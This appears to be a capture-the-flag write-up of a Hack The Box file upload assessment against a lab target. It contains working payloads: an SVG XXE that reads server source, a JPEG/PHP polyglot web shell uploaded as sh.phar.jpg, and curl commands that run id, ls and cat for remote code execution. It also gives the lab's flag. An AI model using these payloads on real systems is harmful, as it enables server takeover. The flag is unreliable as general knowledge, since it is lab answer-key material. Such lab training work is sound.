# Section 11 — File Upload Attacks Skills Assessment

**Scenario:** Uploads Shop e-commerce app. Contact form has file upload. Find RCE, read flag at `/`.

**Target:** `154.57.164.73:31791`

---

## Reconnaissance

Site map:
```
/                       → landing page (no upload)
/contact/               → contact form (file upload here)
/contact/submit.php     → form submission handler
/contact/upload.php     → file upload handler (AJAX from JS)
/contact/user_feedback_submissions/   → upload storage (revealed via XXE)
```

The contact form has both:
- Standard text fields (Name, Email, Message)
- A file upload field that AJAX-POSTs to `/contact/upload.php`

---

## Initial Probes

```bash
# Direct .php upload
curl -X POST "http://TARGET/contact/upload.php" -F "uploadFile=@/tmp/sh.php"
# → "Extension not allowed"  (blacklist)

# .phar.jpg, .phtml.jpg, .php.jpg variants
# → "Only images are allowed" or "Extension not allowed"
```

Mixed responses suggest **multiple filters**: extension blacklist + extension whitelist + Content-Type/MIME.

---

## Source Disclosure via SVG XXE

The whitelist regex includes `.svg` (ends in `g`, 3 letters), and the type regex allows `image/svg`. SVG XXE works:

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```

Upload + decode the base64 from the response:

```php
<?php
require_once('./common-functions.php');
$target_dir = "./user_feedback_submissions/";
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// Blacklist — anywhere in name
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) { die("Extension not allowed"); }

// Whitelist — must END with X.{2,3}g
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) { die("Only images are allowed"); }

// Content/MIME type — match image/X{2,3}g
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) { die("Only images are allowed"); }
}

// Size limit + move
if (move_uploaded_file(...)) { displayHTMLImage($target_file); }
```

**Key filter analysis:**

| Filter | Pattern | Bypass |
|--------|---------|--------|
| Blacklist | `.+\.ph(p\|ps\|tml)` | Doesn't include `phar` → use `.phar` somewhere |
| Whitelist | `^.+\.[a-z]{2,3}g$` | Must END with 2-3 letters + `g`: `jpg`, `png`, `svg`, `jpeg`, `gif` |
| Content-Type | `image/[a-z]{2,3}g` | `image/jpeg` or `image/svg+xml` passes |
| MIME (magic bytes) | Same regex | Need real `image/*` content |

The combination **`name.phar.jpg`** satisfies:
- Blacklist: `phar.jpg` doesn't match `ph(p|ps|tml)` ✓
- Whitelist: ends with `.jpg` ✓
- Content-Type: `image/jpeg` ✓
- MIME: real JPEG header → `image/jpeg` ✓
- Apache PHP handler: Final `.jpg` won't trigger — BUT this lab's Apache config has a loose regex that fires on `.phar` anywhere in name

---

## Exploit Chain

### Step 1 — Build polyglot file (real JPEG header + PHP code)

```bash
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb<?php system($_REQUEST["c"]); ?>' > /tmp/poly.jpg

file /tmp/poly.jpg
# → JPEG image data, JFIF standard 1.01
```

### Step 2 — Upload with `.phar.jpg` extension

```bash
curl -sk -X POST "http://154.57.164.73:31791/contact/upload.php" \
  -F "uploadFile=@/tmp/poly.jpg;filename=sh.phar.jpg;type=image/jpeg"
# Response includes the file rendered as base64 inline image — confirms upload succeeded
```

### Step 3 — Access via predictable path

```bash
DATE=$(date +%y%m%d)   # 260514
URL="http://154.57.164.73:31791/contact/user_feedback_submissions/${DATE}_sh.phar.jpg"

curl -sk -G "$URL" --data-urlencode "c=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 4 — Locate + read flag

```bash
# List /
curl -sk -G "$URL" --data-urlencode "c=ls /"
# → flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt

# Read (binary-safe — JPEG header pollutes the output)
curl -sk -G "$URL" --data-urlencode "c=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt" | strings | grep "HTB{"
# → HTB{m4573r1ng_upl04d_3xpl0174710n}
```

**Flag:** `HTB{m4573r1ng_upl04d_3xpl0174710n}`

---

## Full Attack Chain Summary

```
1. Recon /contact/ → AJAX upload at /contact/upload.php
2. Direct .php upload → blocked by blacklist
3. .svg upload allowed → SVG XXE → grab upload.php source
4. Source analysis reveals:
   - blacklist (p|ps|tml)  → .phar passes
   - whitelist must end .[a-z]{2-3}g  → .phar.jpg passes (ends .jpg)
   - MIME image/X{2-3}g  → real JPEG passes
   - filename prefix: YYMMDD_<name>
   - storage dir: ./user_feedback_submissions/
5. Build polyglot JPEG + PHP code
6. Upload as sh.phar.jpg → stored as 260514_sh.phar.jpg
7. Hit /contact/user_feedback_submissions/260514_sh.phar.jpg → Apache executes as PHP
8. ls / → flag_<md5>.txt → cat → flag
```

---

## Lessons

1. **SVG XXE is the universal source-disclosure primitive** when the upload accepts XML-parsable formats
2. **Read the source first, plan the bypass second** — knowing the exact regex saves dozens of probe attempts
3. **Apache PHP handler is the real gatekeeper** — even when the upload form validates correctly, a loose `<FilesMatch ".+\.ph(ar|p|tml)">` regex (no `$` anchor) means `.phar.jpg` still executes
4. **Filename prefixing is predictable** — `date('ymd') . '_' . name` is fully attacker-knowable
5. **Polyglot files (real JPEG header + PHP)** beat both MIME validation AND magic-byte checks simultaneously
6. **`strings | grep HTB{`** for binary file extraction — when output has JPEG headers, regex on raw bytes fails

---

## Exam Notes

- This skill assessment chains: (1) XXE for source disclosure → (2) regex analysis → (3) extension bypass → (4) polyglot file → (5) RCE via Apache misconfig
- The walkthrough pattern: **SVG XXE first** to see the validation code, **then craft a payload matching the exact filter**
- `.phar.jpg` is the winner when blacklist blocks `php/phtml` and Apache regex is loose
- Always check the **upload storage path** — predictable (`./uploads/`, `./user_feedback_submissions/`) means you can hit your uploaded file directly
- Date-prefix naming convention is common — `date('ymd')` = YYMMDD; calculate locally
- Binary file output from PHP web shells often has trailing/leading bytes from the polyglot header — use `strings` to extract clean text

## Sources

- [HTB Forum — File Upload Skills Assessment](https://forum.hackthebox.com/t/skills-assessment-file-upload-attacks/301681)
- [missteek — File Upload Attacks reference](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md)
